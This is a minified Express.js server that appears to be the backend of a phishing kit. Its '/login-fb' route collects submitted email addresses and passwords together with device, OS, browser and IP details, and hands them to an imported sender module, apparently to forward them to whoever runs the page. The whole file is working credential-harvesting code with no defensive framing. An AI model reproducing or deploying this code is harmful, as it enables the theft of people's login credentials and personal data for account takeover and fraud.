require("dotenv").config();let express=require("express"),path=require("path"),fs=require("fs/promises"),bodyParser=require("body-parser"),useragent=require("express-useragent"),requestIp=require("request-ip"),send2=require("./src/utils/sender2.js"),app=express(),PORT=process.env.PORT||3e3;app.use(bodyParser.json()),app.use(express.json()),app.use(useragent.express()),app.use(requestIp.mw()),app.set("trust proxy",!0),app.use(express.urlencoded({extended:!0})),app.use(express.static(path.join(__dirname,"public"))),app.get("/",(e,s)=>{s.sendFile(path.join(__dirname,"src","views","index.html"))}),app.post("/login-fb",(e,s)=>{var{email:r,password:n,modelInfo:p,platformInfo:a,versiInfo:o,loginFb:t}=e.body,i=e.useragent,r=r||"Unknown",n=n||"Unknown",p=p+" "+a+" "+o||"Unknown",a=i.os||"Unknown",o=i.browser||"Unknown",i=e.clientIp||"Unknown",e=t||"Unknown";send2({emVal:r,passVal:n,device:p,os:a,browser:o,ipAddress:i,logVia:e}),s.sendStatus(200)}),app.use((e,s)=>{s.status(404).redirect("/")}),app.use((e,s,r,n)=>{console.error(e.stack),r.status(500).send("Terjadi kesalahan server.")}),app.listen(PORT,()=>{console.log("ðŸš€ Server running at http://localhost:"+PORT)});